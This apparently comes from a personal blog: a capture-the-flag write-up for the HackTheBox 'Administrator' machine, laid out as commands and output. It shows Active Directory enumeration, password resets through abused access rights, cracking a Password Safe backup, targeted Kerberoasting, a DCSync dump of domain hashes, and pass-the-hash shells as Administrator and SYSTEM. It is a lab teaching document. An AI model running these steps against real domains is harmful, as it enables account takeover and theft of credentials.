---
title: HTB Administrator Writeup
description: Administrator is a medium-level Windows machine on HTB, which released on November 9, 2024.
date: 2024-11-22 11:33:00 +0800
categories: [HacktheBox, Medium]
tags: [ctf, hackthebox, windows]
math: true
mermaid: true
image:
  path: /assets/img/htb/administrator.htb/adm.JPG
---
## Box Info

Administrator starts off with a given credentials by box creator for olivia. Using this credentials, Domain info can be dumped and viewed with bloodhound. From the Bloodhound 
olivia user has GenericAll rights on michael user which can be used to change the user password. Michael user has ForceChangePassword on benjamin user and his password can also
be changed. With benjamin's password, attacker can login to ftp to download a backup file. From the file emily user is owned.Emily has GenericWrite on ethan which can be abused 
with targetedKerberoast. Ethan has DSync right on Domain Controller which can be used to dump Administrator hash.
## Recon
### Nmap
Nmap finds the following ports open. We have a `Windows` machine and `Active Directory`.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ nmap -sVC 10.129.130.198
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 21:43 +03
Nmap scan report for administrator.htb (10.129.130.198)
Host is up (0.066s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-22 18:43:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-22T18:43:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.37 seconds
```

Found the domain as `administrator.htb`, adding it to `/etc/hosts` file.
```text
# Others
10.129.130.198 administrator.htb
```
### Olivia
We are also given a account cred as 'Olivia:ichliebedich' by Box Creator.

![w1](/assets/img/htb/administrator.htb/cred.JPG){: width="800" height="800" }

Saw `ftp` on port `21`, trying `olivia` creds but got `Login Failed`.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ ftp 10.129.130.198
Connected to 10.129.130.198.
220 Microsoft FTP Service
Name (10.129.130.198:suce): olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed
```
Trying to read `smb shares` but no useful shares.
```console
┌──[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ crackmapexec smb 10.129.130.198 -u 'olivia' -p 'ichliebedich' --shares
SMB         10.129.130.198  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.130.198  445    DC               [+] administrator.htb\olivia:ichliebedich
SMB         10.129.130.198  445    DC               [*] Enumerated shares
SMB         10.129.130.198  445    DC               Share           Permissions     Remark
SMB         10.129.130.198  445    DC               -----           -----------     ------
SMB         10.129.130.198  445    DC               ADMIN$                          Remote Admin
SMB         10.129.130.198  445    DC               C$                              Default share
SMB         10.129.130.198  445    DC               IPC$            READ            Remote IPC
SMB         10.129.130.198  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.130.198  445    DC               SYSVOL          READ            Logon server share
```
Also trying `winrm` and it' successful.
```console
[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ crackmapexec winrm 10.129.130.198 -u 'olivia' -p 'ichliebedich'
SMB         10.129.130.198  5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:administrator.htb)
HTTP        10.129.130.198  5985   DC               [*] http://10.129.130.198:5985/wsman
HTTP        10.129.130.198  5985   DC               [+] administrator.htb\olivia:ichliebedich (Pwn3d!)
```
Logging in using `evil-winrm`. Checking `olivia` privs and files but nothing useful.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ evil-winrm -i 10.129.130.198 -u 'olivia' -p 'ichliebedich'
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
There are some other `users` in the domain, so we might get something from `Bloodhound`.
```console
*Evil-WinRM* PS C:\Users\olivia\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            alexander                benjamin
emily                    emma                     ethan
Guest                    krbtgt                   michael
olivia
```
## Owning Michael
### Bloodhound
Using `bloodhound.py` to extract information from domain which we can use `Bloodhound` to view.
```console
┌──[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ /opt/BloodHoundpy/bloodhound.py -d administrator.htb -ns 10.129.130.198 -u olivia -p ichliebedich -c All --zip
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 12S
INFO: Compressing output into 20241122222243_bloodhound.zip
```

Use `sudo neo4j console` to open the database and enter with `Bloodhound`. Click `upload data` from up-right corner or just drag the zip file into Bloodhound
and it starts uploading the files.

![w1](/assets/img/htb/administrator.htb/bh1.JPG){: width="800" height="500" }

We are currently `olivia` user so let's check the node info. Olivia has a `First Degree Object Control`(will refer as FDOC). Click on it and 
we can see Olivia has `GenericAll` right on `michael` user.

![w1](/assets/img/htb/administrator.htb/bh2.JPG){: width="800" height="500" }
### GenericAll 
`GenericAll` simply gives full access over a target user account. Easiest way is using `net user` to change the account password.
```console
*Evil-WinRM* PS C:\Users\olivia\Documents> net user michael michael /domain
The command completed successfully.
```
Lets check the `smb` if password is correctly changed and it works.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ crackmapexec smb 10.129.130.198 -u 'michael' -p 'michael' 
SMB         10.129.130.198  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.130.198  445    DC               [+] administrator.htb\michael:michael
```
## Owning Benjamin 

Alreading having `Bloodhound` open, we can also check for `michael` node info if he has any rights. Michael also has a FDOC which has `ForceChangePassword` on `benjamin` user.

![w1](/assets/img/htb/administrator.htb/bh3.JPG){: width="800" height="500" }
### ForceChangePassword 

Simplest way to abuse `ForceChangePassword` if you don't have a shell is use `rpcclient` with `setuserinfo2`.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ rpcclient -U michael 10.129.130.198
Password for [WORKGROUP\michael]:    
rpcclient $> setuserinfo2 benjamin 23 'benjamin'
rpcclient $> exit
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ crackmapexec smb 10.129.130.198 -u 'benjamin' -p 'benjamin' 
SMB         10.129.130.198  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.130.198  445    DC               [+] administrator.htb\benjamin:benjamin
```
## Owning Emily
### Ftp Login
Checking Bloodhound for `benjamin` doesn't have any rights but he is a member of `Share Moderators` group. Let's try the creds on `ftp`.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ ftp 10.129.130.198
Connected to 10.129.130.198.
220 Microsoft FTP Service
Name (10.129.130.198:suce): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```
There is a backup file which is `password safe 3`. Downloading the file to my machine.
```console
ftp> dir
229 Entering Extended Passive Mode (|||57639|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||57645|)
125 Data connection already open; Transfer starting.
100% |*************************************************************************************************************************************************|   952       10.09 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (6.76 KiB/s)
```
### PasswordSafe3
We can use [**pwsafe**](https://github.com/pwsafe/pwsafe/releases) to open the file. Asks us for a password to open the file.

![w1](/assets/img/htb/administrator.htb/ps.JPG){: width="800" height="500" }

If i remember correctly `hashcat` had a `psafe3` option. Using the mode `5200` to crack, gives the password.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Backup.psafe3:tekieromucho                                
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5200 (Password Safe v3)
Hash.Target......: Backup.psafe3
Time.Started.....: Fri Nov 22 23:05:02 2024 (1 sec)
Time.Estimated...: Fri Nov 22 23:05:03 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10142 H/s (8.57ms) @ Accel:512 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:2048-2049
Candidate.Engine.: Device Generator
Candidates.#1....: Liverpool -> iheartyou
Hardware.Mon.#1..: Util: 56%

Started: Fri Nov 22 23:05:00 2024
Stopped: Fri Nov 22 23:05:04 2024
```
Opening the file with the cracked password gives passwords for `alexander`,`emily` and `emma`.

![w1](/assets/img/htb/administrator.htb/ps1.JPG){: width="800" height="500" }
## Owning Ethan

Enumerating the 3 users on Bloodhound, only `emily` is useful. Emily has a FDOC which allows `GenericWrite` on `ethan` user. 

![w1](/assets/img/htb/administrator.htb/bh4.JPG){: width="800" height="500" }
### Targeted Kerberoast
If you don't know what `kerberosting` is, simply if a Domain Account has `SPN` registered, an attacker can request Service Ticket using Kerberos, extract the ticket (for example with
`PowerView` or `GetUserSPNs.py`) and try to crack it offline. But in our case `ethan` user doesn't have a SPN registered. So what we can do is, using our `GenericWrite` we can create
a SPN for `ethan` user then request a ticket and try to crack it with the help of `targetedKerberoast.py`.

```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ git clone https://github.com/ShutdownRepo/targetedKerberoast
Cloning into 'targetedKerberoast'...
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ cd targetedKerberoast/
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator/targetedKerberoast]
└──╼ $ targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVT*******' (Passwords are Not Shown)
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c05aebe711329dc8b03ca8c9c4e7e949$f2e699a255e6293b5b2c1ddce051426f50e157b16058e442c1a6c1c0cc3296dc69538719f860c27b4cff952e80a62191fee9108d51070206204c1fea3cae02ee322c61d1ef5c75f4e5df084a1a5277eb559c32edf3d823331dd3e9e08d1e93477079b26ee504a4c5017952b7def267248cfa66de382e1d6e9095913d0da6415b99b1c32b91711841b7d991802fe770e2a3f3db08c4753e116d1491048db63a6b7a50a6349d92102cd1d6ae500384b43aebdf17945c2589a32db7d1b8d81e3a015791addbb53c10f2f7d618970a2d974467e483c90bca358f0430508dbd3f5d707ac1778eaba14587965ebb6f0f4aa9d1034f08e6012ceb3302cbead14a405d2064fce29d9aaf15b82ae08a5106ccba875b9cf6f54dfc131e97d683fea20422aef65fd22fe25f91a4547f83c12bf733b995703867f75c741c4955c4a69ca8f1f00b8ada200a6d16aebeebde1fe65cb9dc2cef880f1ae5f80dc7dc5ea14e076622228145ee931d9b2a432bc66169b4b3f0ea83effb51422852e75d60574656939e135c2abcfad04433ec1aa1005b4da9df132d62f09e64f9e5440db51e765c4e2d30e7e48d72cf21c3d7713e5b0ea24b7199881e3992c59387bcbcbd3dd7fab8075be5a4867c14fbc15d66eaccf510e1bfd9cbfcd3cc44184ddaac56f5ecb565ac1be85f206cd009aebcf678615b3120d97dea46206f412c1512a56853d2d1e5678e9e74330d99ec580ccb0301b5f463cbf351dc5587311edc3e69dc6002156f5c9a026c87e4c91504085bee1be72f4a29216c21d1e0b903826b3412663e9a2727ca801fa5f67771d7e05e760d59cfdf449050c3239653949e0c4071de9c40a2e8a0c8a37f21cb21b4f1c1f113cba555f77f47bb9e82ed8cb7ef86aab085a47318b714ac4532b60c41365064bccc82d469f6d7d06366bc798099905136b10d8aef1d866768102f35787af9d1ecb452202c481981dbf2c13b9e22dddafbb50250acbdc22170c902ae075748bacd7ac039ba7fdd0cb30d12e8ed6069b7f33af18539ca0521a574e3d18240d5ccb28896ffbfab5995930f16c4f014ea0caef93e6dc293b710d6a3b3fc2ac4967ab74302ea1654555e8b07e20fa7ce92933cd98a5639fe0f622466cd3e79ef8ae31fb6449ff1a45e70dad18923aae3990b2cc1340d03251211f9a332455136dd2c37494dde7a61ac60bb9f3918d041d844c1db4a248442f84745cca1cc39ce1f80cdbf224e36048203bd73398025dd63b9934c03946f54154052d1c9cd7907f32678fb652d694184efa5242d3f85b5ab8828375545149a4491e6eeb6353a567393917b684e0ec054d2b6ec85e443f9ff0f132c9ee530e15ddc6d27518729b14bafef60bcd8f9b60c2aeab86e53e56a76601d51ef984a386ab683f6383920c119087aed6270439b353c435f093424c845246d902fb38f2f0aa4195a1af07a3496629004f7396602e0a6d0edee0e80a1f3012215********************************************
```
Now that we have the `krb5t hash`, trying `hashcat` to crack it and it's successful.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator/targetedKerberoast]
└──╼ $ hashcat krb5t /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$c05aebe711329dc8b03ca8c9c4e7e949$f2e699a255e6293b5b2c1ddce051426f50e157b16058e442c1a6c1c0cc3296dc69538719f860c27b4cff952e80a62191fee9108d51070206204c1fea3cae02ee322c61d1ef5c75f4e5df084a1a5277eb559c32edf3d823331dd3e9e08d1e93477079b26ee504a4c5017952b7def267248cfa66de382e1d6e9095913d0da6415b99b1c32b91711841b7d991802fe770e2a3f3db08c4753e116d1491048db63a6b7a50a6349d92102cd1d6ae500384b43aebdf17945c2589a32db7d1b8d81e3a015791addbb53c10f2f7d618970a2d974467e483c90bca358f0430508dbd3f5d707ac1778eaba14587965ebb6f0f4aa9d1034f08e6012ceb3302cbead14a405d2064fce29d9aaf15b82ae08a5106ccba875b9cf6f54dfc131e97d683fea20422aef65fd22fe25f91a4547f83c12bf733b995703867f75c741c4955c4a69ca8f1f00b8ada200a6d16aebeebde1fe65cb9dc2cef880f1ae5f80dc7dc5ea14e076622228145ee931d9b2a432bc66169b4b3f0ea83effb51422852e75d60574656939e135c2abcfad04433ec1aa1005b4da9df132d62f09e64f9e5440db51e765c4e2d30e7e48d72cf21c3d7713e5b0ea24b7199881e3992c59387bcbcbd3dd7fab8075be5a4867c14fbc15d66eaccf510e1bfd9cbfcd3cc44184ddaac56f5ecb565ac1be85f206cd009aebcf678615b3120d97dea46206f412c1512a56853d2d1e5678e9e74330d99ec580ccb0301b5f463cbf351dc5587311edc3e69dc6002156f5c9a026c87e4c91504085bee1be72f4a29216c21d1e0b903826b3412663e9a2727ca801fa5f67771d7e05e760d59cfdf449050c3239653949e0c4071de9c40a2e8a0c8a37f21cb21b4f1c1f113cba555f77f47bb9e82ed8cb7ef86aab085a47318b714ac4532b60c41365064bccc82d469f6d7d06366bc798099905136b10d8aef1d866768102f35787af9d1ecb452202c481981dbf2c13b9e22dddafbb50250acbdc22170c902ae075748bacd7ac039ba7fdd0cb30d12e8ed6069b7f33af18539ca0521a574e3d18240d5ccb28896ffbfab5995930f16c4f014ea0caef93e6dc293b710d6a3b3fc2ac4967ab74302ea1654555e8b07e20fa7ce92933cd98a5639fe0f622466cd3e79ef8ae31fb6449ff1a45e70dad18923aae3990b2cc1340d03251211f9a332455136dd2c37494dde7a61ac60bb9f3918d041d844c1db4a248442f84745cca1cc39ce1f80cdbf224e36048203bd73398025dd63b9934c03946f54154052d1c9cd7907f32678fb652d694184efa5242d3f85b5ab8828375545149a4491e6eeb6353a567393917b684e0ec054d2b6ec85e443f9ff0f132c9ee530e15ddc6d27518729b14bafef60bcd8f9b60c2aeab86e53e56a76601d51ef984a386ab683**********************:limp******
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....b41be3
Time.Started.....: Fri Nov 22 23:27:47 2024 (0 secs)
Time.Estimated...: Fri Nov 22 23:27:47 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   870.9 kH/s (1.17ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6144/14344385 (0.04%)
Rejected.........: 0/6144 (0.00%)
Restore.Point....: 4608/14344385 (0.03%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
```
## Shell as Administrator
### DCSync on Domain Controller
Not that we have `ethan` password, check the rights on bloodhound. Ethan has FDOC which has `DCSync` on the `Domain Controller`.

![w1](/assets/img/htb/administrator.htb/bh5.JPG){: width="800" height="500" }

With `DCSync`, we can dump all passwords on the Domain Controller using `secretsdump.py` from Impacket. (Output and Passwords Not Shown)
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator/targetedKerberoast]
└──╼ $ /home/suce/.local/bin/secretsdump.py administrator.htb/ethan:limp******@10.129.130.198
Impacket v0.12.0.dev1+20240827.174901.2877383 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404************:3dc553ce*********:::
.
.
.
.
.
.
.
[*] Kerberos keys grabbed
.
.
.
.
.
[*] Cleaning up... 
```
Now that we have `Administrator` hash, we can login using `evil-winrm`.
```console
┌─[suce@parrot]─[~/Desktop/htbMachines/medium-administrator/targetedKerberoast]
└──╼ $ evil-winrm -i 10.129.130.198 -u Administrator -H 3dc553ce4b9fd20b**********
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```
Using `psexec.py` gives us a even higher privilege, `nt authority\system`. 
```console
┌──[suce@parrot]─[~/Desktop/htbMachines/medium-administrator]
└──╼ $ /home/suce/.local/bin/psexec.py administrator.htb/Administrator@10.129.130.198 -hashes :3dc553ce4b9fd20b**********
Impacket v0.12.0.dev1+20240827.174901.2877383 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.130.198.....
[*] Found writable share ADMIN$
[*] Uploading file HpuRPwQD.exe
[*] Opening SVCManager on 10.129.130.198.....
[*] Creating service iNWw on 10.129.130.198.....
[*] Starting service iNWw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

User flag can be found in `C:\Users\Emily\Desktop`.

Root flag can be found in `C:\Users\Administrator\Desktop`.

